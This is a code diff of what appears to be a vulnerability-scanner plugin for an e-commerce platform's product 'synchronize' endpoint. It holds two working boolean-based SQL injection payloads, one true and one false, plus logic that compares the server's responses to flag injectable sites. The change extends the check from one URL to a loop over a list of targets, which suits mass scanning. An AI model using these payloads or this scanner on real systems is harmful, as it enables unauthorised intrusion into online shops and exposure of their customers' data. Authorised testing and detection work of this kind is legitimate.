@@ -1,4 +1,4 @@
-#request url = var
+#request urls = array
 #define payload = /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-
 #define payt = /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-
 #define bug =200 OK
@@ -6,13 +6,23 @@
 
 function main(args)
 {
-	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[1],bug,0)!= "-1")
-	{
-		res = HttpGet(url.payt,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-		if(StrFindStr(res[1],"400 Bad Request",0)!= "-1")
-		{
-			print(url.info);
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[1],bug,0)!= "-1")
+			{
+				res = HttpGet(url.payt,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+				if(StrFindStr(res[1],"400 Bad Request",0)!= "-1")
+				{
+					printclolor("[+]".urls[i].info,3);
+				}
+			}
+		}catch{
 		}
+		i = ToInt(i+1);
 	}
 }
